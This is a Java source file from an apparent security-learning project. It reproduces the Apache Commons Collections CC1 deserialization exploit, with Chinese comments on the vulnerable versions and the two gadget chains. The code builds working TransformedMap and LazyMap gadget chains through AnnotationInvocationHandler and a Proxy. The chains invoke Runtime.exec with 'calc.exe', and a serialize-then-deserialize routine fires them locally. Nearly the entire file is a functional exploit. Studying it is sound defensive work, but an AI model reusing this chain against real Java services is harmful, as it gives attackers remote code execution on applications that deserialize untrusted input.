package com.madaha.codesecone.controller.AdvancedAttack.deserialize.CommonCollections;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

/**
 * 注意事项：
 *    进行Apache Commons Collections反序列化漏洞分析与复现。
 *    必须！必须！必须！ 使用存在安全缺陷的版本：Apache Commons Collections3.2.1以下。
 *
 *    存在安全缺陷的版本：
 *      Apache Commons Collections3.2.1以下，【JDK版本：1.7.0_80】 Apache Maven 3.6.3。
 */

// 测试使用，这里是直接复制了 https://www.extrader.top/posts/c6da5693/#CommonCollections1 这位师傅的代码。
public class CommonCollections1 {

    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1),
        };

        // java 1.8版本可用。
        CC1_LazyMap(transformers);
    }

    // java8后无法使用：因为 AnnotationInvocationHandler 类被改写。
    // 而此时使用的是 java1.8，所以对 CC1 的利用链进行修改。
    public static void CC1_TransformedMap(Transformer[] transformers) throws Exception {
        /*
            Gadget chain:
                ObjectInputStream.readObject()
                    AnnotationInvocationHandler.readObject()
                        entry.setValue()
                            TransformedMap.checkSetValue()
                                ChainedTransformer.transform()
                                    ConstantTransformer.transform()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Class.getMethod()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Runtime.getRuntime()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Runtime.exec()

            Requires:
                commons-collections
         */

        // java8后无法使用，AnnotationInvocationHandler被改写
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "xxxx");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);


        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);

        out(handler);
    }


    // 因为 java 1.8 的 AnnotationInvocationHandler 类被改写
    // 所以，此处使用 TransformedMap 改用 LazyMap 实现。
    public static void CC1_LazyMap(Transformer[] transformers) throws Exception {
        /*
            Gadget chain:
                ObjectInputStream.readObject()
                    AnnotationInvocationHandler.readObject()
                        Map(Proxy).entrySet()
                            AnnotationInvocationHandler.invoke()
                                LazyMap.get()
                                    ChainedTransformer.transform()
                                        ConstantTransformer.transform()
                                        InvokerTransformer.transform()
                                            Method.invoke()
                                                Class.getMethod()
                                        InvokerTransformer.transform()
                                            Method.invoke()
                                                Runtime.getRuntime()
                                        InvokerTransformer.transform()
                                            Method.invoke()
                                                Runtime.exec()

            Requires:
                commons-collections
         */

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);


        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);

        // AnnotationInvocationHandler实际上就是一个InvocationHandler
        // 我们如果将这个对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到 AnnotationInvocationHandler#invoke 方法中
        // 进而触发我们的LazyMap#get,随后的利用链就和TransformedMap的一样了
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);

        out(handler);
    }


    // 序列化 与 反序列化 漏洞代码测试。
    public static void out(InvocationHandler handler) throws Exception {
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }

}
